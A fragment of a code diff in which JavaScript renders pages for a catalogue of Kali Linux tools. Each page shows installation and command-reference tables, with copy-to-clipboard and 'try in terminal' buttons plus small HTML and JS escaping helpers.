+                        <p>${tool.description}</p>
+                        ${tool.note ? `<div class="kali-note">${tool.note}</div>` : ''}
+                    </div>
+                    <div class="kali-install">
+                        <label>INSTALLATION:</label>
+                        <code>${tool.installation}</code>
+                        <button class="cyber-btn small" onclick="copyToClipboard('${tool.installation}')">COPY</button>
+                    </div>
+                </div>
+
+                <h3>COMMANDS REFERENCE</h3>
+                <div class="kali-commands-table">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>COMMAND</th>
+                                <th>DESCRIPTION</th>
+                                <th>EXAMPLE</th>
+                                <th>ACTIONS</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            ${tool.commands.map((cmd, idx) => `
+                                <tr>
+                                    <td><code>${escapeHtml(cmd.cmd)}</code></td>
+                                    <td>${cmd.desc}</td>
+                                    <td><code class="example">${escapeHtml(cmd.example)}</code></td>
+                                    <td class="actions">
+                                        <button class="cyber-btn small" onclick="copyToClipboard('${escapeJs(cmd.example)}')">COPY</button>
+                                        <button class="cyber-btn small try-terminal" data-cmd="${escapeHtml(cmd.example)}">TRY</button>
+                                    </td>
+                                </tr>
+                            `).join('')}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        `;
+
+        // Add TRY IN TERMINAL handlers
+        panel.querySelectorAll('.try-terminal').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const cmd = btn.dataset.cmd;
+                tryInTerminal(cmd);
+            });
+        });
+    }
+
+    // Helper: escape HTML
+    function escapeHtml(str) {
+        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+    }
+
+    // Helper: escape JS string
+    function escapeJs(str) {
+        return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
+    }
+
+    // Copy to clipboard helper (global)
+    window.copyToClipboard = function(text) {
+        navigator.clipboard.writeText(text).then(() => {
+            // Brief visual feedback could be added here
+        });
+    };
+
+    // Try command in terminal
+    function tryInTerminal(cmd) {
+        // Store command to be used by terminal
+        localStorage.setItem('cyber_terminal_cmd', cmd);
+        // Navigate to terminal
+        navigateTo('terminal/shell');
+        // Show notification
+        setTimeout(() => {
+            alert(`Command copied! Paste it in the terminal:\n\n${cmd}`);
+        }, 300);
+    }
+
+    // Initialize Kali tools pages
+    renderKaliToolsGrid();
+    Object.keys(kaliTools).forEach(toolId => {
+        renderKaliToolDetail(toolId);
+    });
 
 });
